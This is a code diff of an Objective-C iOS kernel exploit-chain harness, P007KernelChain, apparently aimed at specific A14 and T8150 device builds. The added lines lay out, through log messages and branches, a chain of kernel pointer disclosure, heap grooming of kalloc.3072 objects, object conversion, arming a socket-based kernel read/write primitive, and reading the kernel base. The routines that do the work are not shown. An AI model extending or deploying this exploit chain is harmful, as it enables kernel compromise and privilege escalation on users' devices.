@@ -21,7 +21,7 @@
 #include <string.h>
 #include <unistd.h>
 
-#define KRW_BUILD @"t8150-krw-3"
+#define KRW_BUILD @"hunt-krw-4"
 
 @implementation P007KernelChain
 
@@ -75,7 +75,13 @@
 
     L(@"[STEP 3] SKU door");
     if (sku == LabSkuA14_23F77) {
-        L(@"[*] hunt occupancy TAP P044 N=192. conversion ≠ hasKread.");
+        P007Board *disc = [P007Board shared];
+        L(@"[*] DISCLOSE = P010 QueueCreate copyout (P139 harvest 3) + P063 aio kptr (harvest 1).");
+        L(@"[*] P010 kptr is layout. Smash is P044 N=192 into a LIVE 0x820 neighbor.");
+        L(@"[*] SKIP P099 254 and P073 254 — those remaining-fire into a FREE kalloc.3072 (MAF).");
+        L([NSString stringWithFormat:@"[*] board leaks after harvest unique=%lu (P010 records KPTR hits)",
+           (unsigned long)disc.leaks.count]);
+        L(@"[*] hunt occupancy TAP P044 N=192. conversion ≠ hasKread. 254 remaining-fire SKIP.");
         [LabDeviceProfile beginHuntGroom];
         NSString *gm = [LabDeviceProfile gameModeLine];
         if (gm.length) L(gm);
@@ -88,6 +94,12 @@
         [LabLearn recordPath:@"conv" result:rc evidence:@"KERNEL P044"];
         L([NSString stringWithFormat:@"PATH_TEST id=occ result=%@", ro]);
         L([NSString stringWithFormat:@"PATH_TEST id=conv result=%@", rc]);
+        if ([rc isEqualToString:@"PASS"]) {
+            L(@"[*] conversion CONFIRMED this TAP. SocketKRW.Arm HOLD — no rw_inpcb KVA.");
+            L(@"[*] 3072 occupancy does not feed icmp6filt +0x148. LightSword last-wire catalog-isolated.");
+        } else {
+            L(@"[*] conversion unnamed. Occupancy WRITE is not Arm. kreadtest below is the honest miss.");
+        }
     } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
         L(@"[*] 17 pair: P114 sel-8 serializer (READ-ONLY) then P149 conversion. 43748 clamp-CLOSED.");
         NSString *p114 = nil;
@@ -137,7 +149,8 @@
     L(@"=== KERNEL T1 END ===");
     L(@"[*] Occupancy CLASS / P139 harvest / P114 REACH are not hasKread.");
     if (sku == LabSkuA14_23F77) {
-        L(@"[*] hunt FORMULA: P044 N=192 occupancy → conversion unnamed → SocketKRW.Arm → kread32. P110/P142 catalog-solo.");
+        L(@"[*] hunt FORMULA: disclose(P010/P063 via P139) → write(P044 N=192 LIVE) → convert → SocketKRW.Arm(rw_inpcb) → kread32.");
+        L(@"[*] P099/P073 254 are STANDALONE MAF occupancy. They are not this chain.");
     } else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
         L(@"[*] 17 FORMULA: leak(P114) → write(P142 prepare-then-overshoot inside P149) → convert(P149 pipes) → kread32(kbase)==0xfeedfacf → sptm(HOLD)");
         L(@"[*] PIPE-HIT / QUEUE-INIT is a write receipt, not kread32. P110 catalog-solo. AfterKread HOLD.");
